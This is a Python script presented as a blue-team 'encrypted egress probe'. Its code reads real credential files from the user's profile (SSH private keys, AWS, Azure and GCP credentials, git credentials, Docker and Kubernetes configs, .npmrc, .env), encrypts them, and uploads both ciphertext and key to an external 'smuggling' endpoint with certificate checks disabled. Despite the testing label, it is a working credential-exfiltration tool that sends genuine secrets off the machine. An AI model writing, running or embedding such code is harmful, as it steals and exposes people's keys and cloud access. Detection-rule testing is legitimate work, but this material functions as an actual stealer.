"""Encrypted HTTPS probe for blue-team security rule testing.

This module reads configured local files and sends their content inside an
encrypted transport payload.
"""

from __future__ import annotations

import argparse
import base64
import ctypes
import json
import os
import platform
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone

try:
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    _CRYPTO_IMPORT_ERROR = None
except ImportError as exc:  # pragma: no cover - depends on runtime environment
    padding = Cipher = algorithms = modes = None  # type: ignore[assignment]
    _CRYPTO_IMPORT_ERROR = exc

# Paths whose contents are included in the encrypted payload.
PATHS = [
    # SSH
    r"%USERPROFILE%\.ssh\id_rsa",
    r"%USERPROFILE%\.ssh\id_ed25519",
    r"%USERPROFILE%\.ssh\id_ecdsa",
    r"%USERPROFILE%\.ssh\id_dsa",
    r"%USERPROFILE%\.ssh\config",
    r"%USERPROFILE%\.ssh\known_hosts",
    r"%USERPROFILE%\.ssh\authorized_keys",
    # AWS
    r"%USERPROFILE%\.aws\credentials",
    r"%USERPROFILE%\.aws\config",
    # Azure
    r"%USERPROFILE%\.azure\accessTokens.json",
    r"%USERPROFILE%\.azure\azureProfile.json",
    # GCP
    r"%APPDATA%\gcloud\credentials.db",
    r"%APPDATA%\gcloud\application_default_credentials.json",
    # Git
    r"%USERPROFILE%\.gitconfig",
    r"%USERPROFILE%\.git-credentials",
    # Docker
    r"%USERPROFILE%\.docker\config.json",
    # Kubernetes
    r"%USERPROFILE%\.kube\config",
    # NPM
    r"%USERPROFILE%\.npmrc",
    # Generic env files
    r"%USERPROFILE%\.env",
    r"%USERPROFILE%\test\testconfig.txt",
]

HOST = "https://koerberpurple.koerber.net/smuggling/upload.php"
DEFAULT_COUNT = 1
DEFAULT_INTERVAL_SECONDS = 1.0
DEFAULT_TIMEOUT_SECONDS = 10.0
DEFAULT_JITTER_SECONDS = 0.0


def _expand_path(path: str) -> str:
    if os.name == "nt":
        # Use WinAPI expansion to match native Windows environment resolution.
        expanded = _expand_env_vars_winapi(path)
        return expanded if expanded else path
    user_profile = os.getenv("USERPROFILE") or os.path.expanduser("~")
    return path.replace("%USERPROFILE%", user_profile)


def _expand_env_vars_winapi(path: str) -> str | None:
    kernel32 = getattr(ctypes, "windll", None)
    if kernel32 is None:
        return None
    expand_fn = kernel32.kernel32.ExpandEnvironmentStringsW
    required = expand_fn(path, None, 0)
    if required <= 0:
        return None
    buffer = ctypes.create_unicode_buffer(required)
    written = expand_fn(path, buffer, required)
    if written <= 0:
        return None
    return buffer.value


def _build_file_records(jitter_seconds: float) -> list[dict[str, str]]:
    records: list[dict[str, str]] = []
    for path in PATHS:
        expanded = _expand_path(path)
        try:
            with open(expanded, "rb") as handle:
                data = handle.read()
            content_b64 = base64.b64encode(data).decode("ascii")
        except OSError:
            # Preserve probe behavior even when the path is absent/unreadable.
            content_b64 = ""
        records.append(
            {
                "declared_path": path,
                "expanded_path": expanded,
                "content_b64": content_b64,
            }
        )

    if jitter_seconds > 0:
        # Optional jitter to spread probe timing without forcing long waits.
        sleep_seconds = (os.urandom(1)[0] / 255) * jitter_seconds
        time.sleep(sleep_seconds)
    return records


def _pkcs7_pad(data: bytes, block_size_bytes: int = 16) -> bytes:
    if padding is None:
        raise RuntimeError("cryptography package is required")
    padder = padding.PKCS7(block_size_bytes * 8).padder()
    return padder.update(data) + padder.finalize()

def _aes256_cbc_encrypt(plaintext: bytes) -> tuple[bytes, bytes, bytes]:
    if Cipher is None or algorithms is None or modes is None or padding is None:
        raise RuntimeError("cryptography package is required")
    key = os.urandom(32)
    iv = os.urandom(16)
    padded = _pkcs7_pad(plaintext)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return key, iv, ciphertext


def _build_probe_transfer(jitter_seconds: float) -> dict[str, object]:
    records = _build_file_records(jitter_seconds)
    payload = {
        "probe_id": str(uuid.uuid4()),
        "probe_type": "security-egress-test",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "paths": PATHS,
        "records": records,
    }
    payload_bytes = json.dumps(payload, sort_keys=True).encode("utf-8")

    aes_key, iv, ciphertext = _aes256_cbc_encrypt(payload_bytes)
    transfer_id = uuid.uuid4().hex
    transfer_filename = f"probe_transfer_{transfer_id}_content.enc"
    key_material = {
        "transfer_id": transfer_id,
        "ciphertext_filename": transfer_filename,
        "scheme": "AES-256-CBC+RAW-KEY",
        "aes_key_b64": base64.b64encode(aes_key).decode("ascii"),
        "iv_b64": base64.b64encode(iv).decode("ascii"),
        "meta": {
            "host": socket.gethostname(),
            "platform": platform.platform(),
        },
    }

    return {
        "scheme": "AES-256-CBC+RAW-KEY",
        "transfer_id": transfer_id,
        "ciphertext": ciphertext,
        "ciphertext_filename": transfer_filename,
        "key_material": json.dumps(key_material, sort_keys=True).encode("utf-8"),
        "key_filename": f"probe_transfer_{transfer_id}_key.json",
    }


def _build_multipart_body(
    fields: list[tuple[str, str]],
    files: list[tuple[str, str, str, bytes]],
) -> tuple[bytes, str]:
    boundary = f"----itslitlib-{uuid.uuid4().hex}"
    boundary_bytes = boundary.encode("ascii")
    chunks: list[bytes] = []

    for name, value in fields:
        chunks.extend(
            [
                b"--" + boundary_bytes + b"\r\n",
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"),
                value.encode("utf-8"),
                b"\r\n",
            ]
        )

    for field_name, filename, content_type, data in files:
        safe_filename = urllib.parse.quote(filename)
        chunks.extend(
            [
                b"--" + boundary_bytes + b"\r\n",
                (
                    f'Content-Disposition: form-data; name="{field_name}"; '
                    f'filename="{safe_filename}"\r\n'
                ).encode("utf-8"),
                f"Content-Type: {content_type}\r\n\r\n".encode("utf-8"),
                data,
                b"\r\n",
            ]
        )

    chunks.append(b"--" + boundary_bytes + b"--\r\n")
    return b"".join(chunks), boundary


def _post_multipart(
    url: str,
    fields: list[tuple[str, str]],
    files: list[tuple[str, str, str, bytes]],
    timeout: float,
) -> tuple[int, str]:
    body, boundary = _build_multipart_body(fields=fields, files=files)
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "itslitlib-net-probe/0.1",
            "X-BlueTeam-Test": "synthetic-encrypted-egress",
        },
    )
    # Intentionally disable certificate verification for controlled probe traffic.
    ssl_context = ssl._create_unverified_context()
    with urllib.request.urlopen(req, timeout=timeout, context=ssl_context) as resp:
        status = resp.getcode()
        response_text = resp.read(2048).decode("utf-8", errors="replace")
    return status, response_text


def _post_probe_files(
    url: str,
    transfer: dict[str, object],
    timeout: float,
) -> tuple[int, str, int, int]:
    key_payload = json.loads(bytes(transfer["key_material"]).decode("utf-8"))
    key_filename = str(transfer["key_filename"])
    ciphertext_filename = str(transfer["ciphertext_filename"])
    key_material = bytes(transfer["key_material"])
    ciphertext = bytes(transfer["ciphertext"])
    fields = [
        ("transfer_id", str(transfer["transfer_id"])),
        ("scheme", str(transfer["scheme"])),
        ("aes_key_b64", str(key_payload.get("aes_key_b64", ""))),
        ("iv_b64", str(key_payload.get("iv_b64", ""))),
        ("key_filename", key_filename),
        ("ciphertext_filename", ciphertext_filename),
    ]
    key_fields = [*fields, ("file_role", "key")]
    content_fields = [*fields, ("file_role", "content")]
    key_files = [
        (
            "f",
            key_filename,
            "application/octet-stream",
            key_material,
        ),
    ]
    content_files = [
        (
            "f",
            ciphertext_filename,
            "application/octet-stream",
            ciphertext,
        ),
    ]

    key_status, key_response_text = _post_multipart(
        url=url,
        fields=key_fields,
        files=key_files,
        timeout=timeout,
    )
    content_status, content_response_text = _post_multipart(
        url=url,
        fields=content_fields,
        files=content_files,
        timeout=timeout,
    )
    merged_response = (
        f"key_status={key_status}; content_status={content_status}; "
        f"key_preview={key_response_text[:120]}; content_preview={content_response_text[:120]}"
    )
    combined_status = content_status if content_status >= 400 else key_status
    return combined_status, merged_response, key_status, content_status


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Send encrypted payloads for security rule testing. "
            "Local file content is read from configured paths."
        )
    )
    parser.add_argument(
        "--url",
        default=HOST,
        help="HTTPS endpoint controlled by blue team.",
    )
    parser.add_argument(
        "--rsa-public-key",
        required=False,
        help="Deprecated and ignored. Kept only for backward CLI compatibility.",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=DEFAULT_COUNT,
        help="Number of probe requests to send.",
    )
    parser.add_argument(
        "--interval-seconds",
        type=float,
        default=DEFAULT_INTERVAL_SECONDS,
        help="Delay between sends in seconds.",
    )
    parser.add_argument(
        "--timeout-seconds",
        type=float,
        default=DEFAULT_TIMEOUT_SECONDS,
        help="HTTPS request timeout in seconds.",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Build multipart upload parts but do not send network traffic.",
    )
    parser.add_argument(
        "--jitter-seconds",
        type=float,
        default=DEFAULT_JITTER_SECONDS,
        help="Maximum random jitter before each probe transfer (default: 0).",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = _build_parser()
    args = parser.parse_args(argv)

    if not str(args.url).lower().startswith("https://"):
        parser.error("--url must start with https://")

    if args.count < 1:
        parser.error("--count must be >= 1")
    if args.jitter_seconds < 0:
        parser.error("--jitter-seconds must be >= 0")

    if not args.dry_run:
        if _CRYPTO_IMPORT_ERROR is not None:
            print(
                "Missing optional dependency: cryptography. "
                "Install with one of: 'python -m pip install itslitlib[net-probe]' "
                "or 'python -m pip install cryptography'.",
                file=sys.stderr,
            )
            return 2

    for index in range(args.count):
        if args.dry_run:
            transfer_id = uuid.uuid4().hex
            print(
                json.dumps(
                    {
                        "event": "dry_run_transfer",
                        "index": index + 1,
                        "url": args.url,
                        "transfer_id": transfer_id,
                        "scheme": "dry-run-preview",
                        "ciphertext_len": 0,
                        "key_file": f"probe_transfer_{transfer_id}_key.json",
                        "ciphertext_file": f"probe_transfer_{transfer_id}_content.enc",
                    }
                )
            )
        else:
            try:
                transfer = _build_probe_transfer(args.jitter_seconds)
                status, response_text, key_status, content_status = _post_probe_files(
                    args.url,
                    transfer,
                    args.timeout_seconds,
                )
                print(
                    json.dumps(
                        {
                            "event": "sent",
                            "index": index + 1,
                            "url": args.url,
                            "transfer_id": transfer["transfer_id"],
                            "status": status,
                            "key_status": key_status,
                            "content_status": content_status,
                            "response_preview": response_text[:200],
                        }
                    )
                )
            except (FileNotFoundError, OSError, ValueError, RuntimeError) as exc:
                print(
                    json.dumps(
                        {
                            "event": "build_error",
                            "index": index + 1,
                            "url": args.url,
                            "error": str(exc),
                        }
                    ),
                    file=sys.stderr,
                )
                return 1
            except urllib.error.URLError as exc:
                print(
                    json.dumps(
                        {
                            "event": "send_error",
                            "index": index + 1,
                            "url": args.url,
                            "error": str(exc),
                        }
                    ),
                    file=sys.stderr,
                )
                return 1

        if index != args.count - 1:
            time.sleep(args.interval_seconds)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())